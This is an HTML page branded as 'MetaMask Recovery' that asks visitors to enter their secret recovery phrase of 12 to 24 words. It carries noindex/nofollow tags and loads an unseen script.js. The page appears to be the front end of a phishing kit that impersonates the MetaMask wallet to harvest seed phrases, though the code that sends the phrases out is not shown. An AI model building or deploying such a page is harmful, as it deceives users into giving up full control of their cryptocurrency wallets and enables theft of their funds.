<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <title>MetaMask Recovery</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="src/css/styles.css">
    <link rel="icon" href="src/asset/svg/favicon.svg" type="image/svg+xml">
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="src/asset/svg/mm-logo.svg" alt="mm" class="header-logo">
            <h1 class="header-title">Unlock Wallet</h1>
            <p class="header-subtitle">Enter your secret recovery phrase</p>
        </header>

        <div class="content">
            <div class="card">
                <div class="card-header">
                    <div class="card-title">Recovery Phrase</div>
                    <select id="wordCount">
                        <option value="12">12 Words</option>
                        <option value="15">15 Words</option>
                        <option value="18">18 Words</option>
                        <option value="21">21 Words</option>
                        <option value="24">24 Words</option>
                    </select>
                </div>
                
                <form id="recoveryForm">
                    <div id="phrasesGrid" class="phrases-grid">
                        <!-- Input fields will be generated by JavaScript -->
                    </div>
                    
                    <button type="button" class="login-btn">Submit</button>
                </form>
            </div>
        </div>
    </div>
    
    <script src="src/js/bip39-words.js"></script>
    <script src="src/js/script.js"></script>
</body>
</html>
